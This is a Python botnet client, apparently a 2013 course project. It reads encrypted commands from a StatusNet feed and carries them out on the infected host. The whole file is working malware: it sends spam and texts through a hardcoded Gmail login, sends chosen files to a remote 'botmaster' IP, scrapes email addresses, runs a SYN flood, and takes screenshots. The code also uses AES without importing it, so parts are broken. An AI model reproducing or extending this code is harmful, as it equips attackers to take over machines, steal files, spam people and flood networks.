#!/usr/bin/env python
# CS577bot.py - CS 577 Final Project
# by Adam Cotenoff (@acotenoff)
# 12 December 2013
import os, sys, urllib, mechanize, re, socket, smtplib, base64, hashlib, random, urllib2, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import pyscreenshot as ImageGrab

# requests statusnet and logs in using provided credentials
def openWebsite():
	# request statusnet
	br = mechanize.Browser()
	response = br.open('http://localhost/statusnet/')
	response1 = br.response() 

	# greeted with login page, so you must login
	br.form = list(br.forms())[0] 
	# I created a user 'test' with password 'test' - need to login with these creds
	control1 = br.form.find_control("nickname")
	control1.value = base64.b64decode("dGVzdA==")
	control2 = br.form.find_control("password")
	control2.value = base64.b64decode("dGVzdA==")
	response = br.submit()
	return response.read()

# uses regular expressions to search for command from feed
def findCommand():
	# calls openWebsite with returns the html source of statusnet
	data = openWebsite()
	try:
		# this indicates the beginning of a command
		m1 = re.search('<p class="entry-content">', data).end()
		temp = data[m1:]
		# this indicates the end of a command
		m2 = re.search('</p>', temp).start()
		command = temp[:m2]
		# returns the actual command
		return command
	except AttributeError:
		return "Invalid Command!!!!"

# when given a command, handles the command and executes its functionality
def handleCommand(command, botServerIP, botServerPort):
	decryptedCommand = decryptCommand(command)
	# protocol which indicates command as command|args[1]|args[2]|.....|args[k]
	args = decryptedCommand.split('-|-')
	print "Received command from botmaster: " + args[0]
	# downloads webpage
	if args[0] == 'downloadWebpage':
		downloadWebpage(args[1])
	# sends spam to indicated user!
	elif args[0] == 'sendSpam':
		sendSpam(args[1], args[2])
	# sends selected file to botmaster
	elif args[0] == 'sendFile':
		sendFile(botServerIP, botServerPort, args[1])
	# sends text to a given number
	elif args[0] == 'sendText':
		sendText(args[1], args[2])
	# scrapes a page for email addresses
	elif args[0] == 'scrapeEmails':
		scrapeEmails(args[1])
	elif args[0] == 'synFlood':
		synFlood(args[1], args[2])
	elif args[0] == 'screenshot':
		screenshot()
	elif args[0] == 'shutdown':
		shutdown()
	else:
		print 'Invalid Command'

# lets download a webpage
def downloadWebpage(url):
	# requests specific url given
	u = urllib.urlopen(url)
	html = u.read()
	u.close()
	# saves html source of url to webpage.html
	file = open('webPage.html', 'w')
	file.write(html)
	file.close()
	print 'Successfully downloaded: ' + url + '\n'

# sends spam sender 'frm' to reciever 'to' with contents of 'message'
def sendSpam(to, message):
	# login for gmail smtp server
	frm = 'CS577finalproject@gmail.com'
	username = 'CS577finalproject'
	password = 'Password!123'
 	# connects to Google SMTP server
	server = smtplib.SMTP('smtp.gmail.com:587')
	# google needs TLS to run and  requires the following
	server.starttls()
	# logins with username and password above
	server.login(username,password)
	# actually sends the message 
	server.sendmail(frm, to, message)
	server.quit()
	print 'Successfully sent email.'

# sends file to the given botmaster 
def sendFile(host, port, file):
	# sets address of the botmaster
	addr = (host, port)

	try:
		# opens the file being sent
		fd = open(file)
		# reads the contents of the file
		data = fd.read()
		# closes the file
		fd.close()
	except IOError:
		print "File does not exist: " + file
		return -1

	# connects to the botmaster
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect_ex(addr)
	# wraps the session with SSL
	sslSocket = socket.ssl(sock)
	# writes the contents of the file to the socket
	sslSocket.write(data)
	# closes the connection to the socket
	sock.close()
	print 'Successfully sent file: ' + file

def sendText(phoneNum, message):
	frm = 'CS577finalproject@gmail.com'
	# login info for gmail smtp
	username = 'CS577finalproject'
	password = 'Password!123'
	# gmail smtp connect
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(username,password)
	server.sendmail(frm, phoneNum, message)
	server.quit()
	print 'Successfully sent text to: ' + phoneNum 

def scrapeEmails(url):
	# regex for email addresses
	EMAIL_REGEX = re.compile("[-a-zA-Z0-9._]+@[-a-zA-Z0-9_]+.[a-zA-Z0-9_.]+")
	# get source
	u = urllib.urlopen(url)
	html = u.read()
	u.close()
	# search for email
	matches = re.findall(EMAIL_REGEX, html)
	emails = '\n'.join(matches)
	# write emails to file
	file = open('emails.txt', 'w')
	file.write(emails)
	file.close()
	print 'Saved emails from ' + url + ' to emails.txt'

def synFlood(destinationIP, destinationPort):
	count = 0 
	while (count < 1000):
		#creates synPacket with destination and port provided
		synPacket = IP(dst=destinationIP)/TCP(flags="S",  sport=RandShort(),  dport=int(destinationPort))
		#sends synPacket
		send(synPacket,  verbose=0)
		count = count + 1
		print('Packet ' + str(count) +  ' Sent')

def screenshot():
	# fullscreen
	im = ImageGrab.grab()
	im.show()

	# to file
	ImageGrab.grab_to_file('screenshot.png')
	print 'Successfully took screenshot and saved to screenshot.png'

def shutdown():
	print 'Shutting down bot!'
	sys.exit()

def decryptCommand(command):
	cipher = base64.b64decode(command)
	password = base64.b64decode('VGVzdDEyMyE=')
	key = hashlib.sha256(password).digest()
	IV = 16 * '\x00'
	mode = AES.MODE_CBC
	decryptor = AES.new(key, mode, IV=IV)
	plain = decryptor.decrypt(cipher)
	n = len(plain) / 16
	return [plain[i:i+n] for i in range(0, len(plain), n)][0]

def main():	
	# Need to run program as root
	if os.getuid() != 0:
   		print("Please run as root.")
   		return -1;

   	# usage checking
   	if len(sys.argv) != 3:
   			print 'Usage: python CS577bot.py [botServerIP] [botServerPort]'
   			return -1

   	# Set server IP and Port from command line arguments
   	botServerIP = sys.argv[1]
   	botServerPort = int(sys.argv[2])

   	# This is where we get the actual command
   	temp = ""
	while 1:
		# search for command on statusnet
		command = findCommand()
		# does not repeat the same command twice
		if temp != command:
			# actually executes the command the command found
			handleCommand(command, botServerIP, botServerPort)
			print "Waiting for new command!"
		# command is used so we do not want to repeat it
		temp = command

if __name__ == "__main__":
	main()
